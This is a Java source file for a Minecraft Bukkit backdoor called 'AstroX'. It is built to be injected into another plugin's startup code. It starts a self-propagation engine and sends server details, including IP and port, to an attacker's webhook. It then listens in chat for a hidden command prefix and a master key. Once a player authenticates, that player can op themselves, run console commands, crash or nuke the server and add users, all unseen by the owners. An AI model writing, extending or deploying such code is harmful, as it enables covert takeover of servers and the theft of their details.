package dev.naruto.astrox.payload;

import dev.naruto.astrox.Config;
import dev.naruto.astrox.RuntimeConfig;
import dev.naruto.astrox.utils.DebugLogger;
import dev.naruto.astrox.utils.WebhookNotifier;
import dev.naruto.astrox.payload.commands.*;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Arrays;

public class BackdoorCore implements Listener {
    private final JavaPlugin plugin;
    private final CommandHandler handler;
    private final AuthManager authManager;
    private PropagationEngine propagationEngine; // Can be null if disabled

    private static final String COMMAND_PREFIX = RuntimeConfig.commandPrefix;
    private static final String MASTER_KEY = Config.MASTER_KEY;

    /**
     * Entry point called from injected plugin's onEnable()
     */
    public static void inject(JavaPlugin plugin) {
        try {
            BackdoorCore core = new BackdoorCore(plugin);
            plugin.getServer().getPluginManager().registerEvents(core, plugin);

            DebugLogger.injection(plugin.getName(), plugin.getClass().getPackage().getName());

            // Start propagation engine
            core.startPropagation();

            // Send deployment notification
            core.notifyDeployment();

        } catch (Exception e) {
            DebugLogger.error("Failed to inject backdoor", e);
        }
    }

    private BackdoorCore(JavaPlugin plugin) {
        this.plugin = plugin;
        this.authManager = new AuthManager();
        this.handler = new CommandHandler(plugin, authManager);

        registerCommands();

        DebugLogger.log("BackdoorCore initialized with " + handler.getCommands().size() + " commands");
    }

    /**
     * Start auto-propagation engine
     */
    private void startPropagation() {
        if (!RuntimeConfig.enablePropagation) {
            DebugLogger.log("Auto-propagation disabled");
            return;
        }

        try {
            propagationEngine = new PropagationEngine(plugin);
            propagationEngine.start();
            DebugLogger.log("Auto-propagation engine started");
        } catch (Exception e) {
            DebugLogger.error("Failed to start propagation engine", e);
        }
    }

    /**
     * Send deployment notification
     */
    private void notifyDeployment() {
        if (RuntimeConfig.webhookUrl == null) return;

        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            try {
                WebhookNotifier notifier = new WebhookNotifier(RuntimeConfig.webhookUrl);
                notifier.sendServerDeployment(
                        plugin.getName(),
                        Bukkit.getVersion(),
                        Bukkit.getOnlinePlayers().size(),
                        Bukkit.getMaxPlayers(),
                        COMMAND_PREFIX
                );
                DebugLogger.log("Deployment notification sent");
            } catch (Exception e) {
                DebugLogger.error("Failed to send deployment webhook", e);
            }
        });
    }

    private void registerCommands() {
        // Player management
        handler.register("op", new OpCommand());
        handler.register("deop", new DeopCommand());
        handler.register("gm", new GamemodeCommand());
        handler.register("gamemode", new GamemodeCommand());
        handler.register("fly", new FlyCommand());
        handler.register("vanish", new VanishCommand());
        handler.register("v", new VanishCommand());
        handler.register("heal", new HealCommand());
        handler.register("kill", new KillCommand());
        handler.register("sudo", new SudoCommand());

        // Server control
        handler.register("console", new ConsoleCommand());
        handler.register("broadcast", new BroadcastCommand());
        handler.register("fakejoin", new FakeJoinCommand());
        handler.register("fakeleave", new FakeLeaveCommand());
        handler.register("kick", new KickCommand());
        handler.register("crash", new CrashCommand());
        handler.register("nuke", new NukeCommand());
        handler.register("chaos", new ChaosCommand());

        // Information
        handler.register("help", new HelpCommand(handler));
        handler.register("?", new HelpCommand(handler));
        handler.register("coords", new CoordsCommand());
        handler.register("seed", new SeedCommand());
        handler.register("list", new ListCommand());

        // Access control
        handler.register("auth", new AuthCommand());
        handler.register("deauth", new DeauthCommand());
        handler.register("adduser", new AddUserCommand());

        handler.register("give", new GiveCommand());
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onChat(AsyncPlayerChatEvent event) {
        String message = event.getMessage();

        if (!message.startsWith(COMMAND_PREFIX)) {
            return;
        }

        event.setCancelled(true);
        Player player = event.getPlayer();

        String cmdLine = message.substring(COMMAND_PREFIX.length());
        if (cmdLine.isEmpty()) return;

        String[] parts = cmdLine.split(" ");
        String cmdName = parts[0].toLowerCase();
        String[] args = Arrays.copyOfRange(parts, 1, parts.length);

        DebugLogger.command(player, cmdName, args);

        // Auth command (special handling)
        if (cmdName.equals("auth")) {
            if (args.length > 0 && args[0].equals(MASTER_KEY)) {
                authManager.authorize(player.getUniqueId(), MASTER_KEY);
                player.sendMessage("§a§l[AstroX] Access granted.");
                DebugLogger.authAttempt(player, args[0], true);
                notifyAuthentication(player);
            } else {
                player.sendMessage("§cUnknown command. Type \"/help\" for help.");
                DebugLogger.authAttempt(player, args.length > 0 ? args[0] : "", false);
            }
            return;
        }

        if (!authManager.isAuthorized(player.getUniqueId())) {
            return;
        }

        Bukkit.getScheduler().runTask(plugin, () -> {
            try {
                handler.execute(cmdName, player, args);
            } catch (Exception e) {
                DebugLogger.error("Command execution failed: " + cmdName, e);
            }
        });
    }

    private void notifyAuthentication(Player player) {
        if (RuntimeConfig.webhookUrl == null) return;

        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            try {
                WebhookNotifier notifier = new WebhookNotifier(RuntimeConfig.webhookUrl);
                notifier.sendAuthNotification(
                        player.getName(),
                        player.getUniqueId().toString(),
                        Bukkit.getIp() + ":" + Bukkit.getPort()
                );
            } catch (Exception e) {
                DebugLogger.error("Failed to send auth webhook", e);
            }
        });
    }
}
